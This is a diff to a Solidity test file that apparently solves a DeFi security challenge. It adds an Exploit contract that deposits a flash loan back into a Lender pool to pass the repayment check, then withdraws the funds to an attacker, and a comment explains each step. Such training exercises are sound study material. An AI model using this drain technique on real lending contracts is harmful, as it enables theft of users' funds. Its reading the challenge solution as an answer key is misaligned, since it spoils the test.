@@ -40,7 +40,11 @@ contract LenderTest is Test {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        Exploit exploit = new Exploit(lenderPool);
 
+        vm.prank(attacker);
+        exploit.run(ETHER_IN_POOL);
         /**
          * EXPLOIT END *
          */
@@ -53,3 +57,45 @@ contract LenderTest is Test {
         assertGt(attacker.balance, attackerInitialEthBalance);
     }
 }
+
+import {IFlashLoanEtherReceiver} from "src/Lender.sol";
+
+contract Exploit is IFlashLoanEtherReceiver {
+    Lender lender;
+
+    constructor(Lender _lender) {
+        lender = _lender;
+    }
+
+    function run(uint256 amount) external {
+        lender.flashLoan(amount);
+        lender.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        lender.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+
+
+/**
+ The Exploit contract is designed to trick the Lender pool into thinking the flash loan was repaid, while actually converting those funds into a
+ withdrawable deposit. Here is the step-by-step breakdown of its purpose:
+
+   1. Interface Compliance: 
+    It implements IFlashLoanEtherReceiver so that the Lender contract can successfully call the execute() function during the flash loan.
+   2. The "Repayment" Trick:
+    When lender.flashLoan is called, it sends the ETH to the Exploit contract and then calls its execute() function. Inside execute(), the contract immediately calls lender.deposit{value: msg.value}(). 
+       * From the Pool's perspective: The ETH has been "returned" to its balance, so the flashLoan check
+         (address(this).balance >= balanceBefore) passes.
+       * From the Accounting perspective: The pool records that the
+         Exploit contract now has a personal balance of 1,000 ETH.
+   3. Extraction:
+    Once the flashLoan function finishes, the Exploit contract calls lender.withdraw(). The pool see that the contract has a 1,000 ETH balance (from the
+    deposit in step 2) and sends the ETH back to the Exploit contract.
+   4. Delivery:
+    Finally, the Exploit contract transfers the stolen ETH to the attacker's address to satisfy the test's validation requirements.
+ */
